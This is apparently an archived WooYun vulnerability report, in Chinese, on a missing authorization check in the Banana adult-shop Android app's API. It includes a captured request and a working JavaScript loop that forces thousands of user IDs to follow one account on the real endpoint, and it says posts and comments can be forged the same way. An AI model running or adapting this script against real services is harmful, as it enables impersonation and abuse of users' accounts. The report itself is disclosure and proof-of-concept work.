{"id": 80823, "wybug_id": "wooyun-2015-0155078", "wybug_title": "Banana情趣商城安卓APP接口未拦截导致任意操作", "wybug_corp": "Banana情趣商城", "wybug_author": "DaraW", "wybug_date": "2015-11-23 18:06", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 接口未做拦截可以执行任意操作 详细说明：  通过Fiddler抓包，可看到关注好友时发起请求的内容和接收的内容：\nPOST http://interface2.0.ibananas.cn/api/user/addattention.json HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; X9180 Build/KVT49L)Host: interface2.0.ibananas.cnConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 64pno=yingyongbao&FriendId=358535&ver=banana_A2.0.1&UserId=347010&\n 其中FriendId为关注者ID，UserId为被关注者Id；通过修改值可以强制任意用户关注任意用户，写了个刷粉脚本，代码如下：\n<!DOCTYPE html><html lang=\"en\"><head>\t<meta charset=\"UTF-8\">\t<title>test</title></head><body><button id=\"sendPost\">发包测试</button><script type=\"text/javascript\">\tvar sendButton = document.getElementById(\"sendPost\");\tsendButton.onclick = function() {\t\tfor (i = 25000; i < 233333; i++) {\t\t\tvar xhr = new XMLHttpRequest();\t\t\txhr.onreadystatechange = function() {\t\t\t\tif (xhr.readyState == 4) {\t\t\t\t\tif ((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {\t\t\t\t\t} else {\t\t\t\t\t\tconsole.log(\"unsuccess: \" + xhr.status);\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\txhr.open(\"post\", \"http://interface2.0.ibananas.cn/api/user/addattention.json\", true);\t\t\txhr.send(\"pno=yingyongbao&FriendId=\" + i + \"&ver=banana_A2.0.1&UserId=358535&\");\t\t}\t};</script></body></html>\n \n\n\n\n跑了一会儿，嗯，效果还不错。屌丝逆袭成大V。然而这并没有结束。同样获取到评论接口，对应稍微修改脚本即可，强制任意ID发帖。\n\nID才是关键，如何获取指定用户ID？看到目标用户后，在进入用户详情页时会会抓取到传输内容中的ID。  更多的就懒得再测试了，后端没有添加拦截，可以随意利用他人ID操作APP内可以进行的操作，发帖，评论，关注好友等等。   漏洞证明：  刷粉脚本，效果图。其他操作仅需稍微修改该脚本即可。\n\n\n\n\n\n\n\n   修复方案：  后端添加请求验证，未授权的进行拦截。   版权声明：转载请注明来源 DaraW@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}